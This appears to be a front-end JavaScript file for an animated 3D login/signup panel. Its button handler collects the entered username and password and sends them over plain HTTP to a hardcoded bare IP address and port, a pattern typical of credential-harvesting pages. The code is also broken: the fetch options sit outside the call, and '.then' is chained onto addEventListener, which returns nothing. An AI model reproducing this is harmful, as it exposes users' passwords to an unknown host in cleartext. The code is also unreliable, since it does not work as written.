let prism = document.querySelector(".rec-prism");

function showSignup(){
  prism.style.transform = "translateZ(-100px) rotateY( -90deg)";
}
function showLogin(){
  prism.style.transform = "translateZ(-100px)";
}
function showForgotPassword(){
  prism.style.transform = "translateZ(-100px) rotateY( -180deg)";
}

function showSubscribe(){
  prism.style.transform = "translateZ(-100px) rotateX( -90deg)";
}

function showThankYou(){
  prism.style.transform = "translateZ(-100px) rotateX( 90deg)";
}

const $=document
const username = $.querySelector('.username')
const password = $.querySelector('.password')
const button = $.querySelector('button')

button.addEventListener('click', (e) => {
  e.preventDefault()
  let userData = {
    username: username.value,
    password: password.value,
  }
  fetch('http://2.179.170.190:1234'), {
    method:'POST',
    body: JSON.stringify(userData)
  }
})
.then(res => console.log(res))
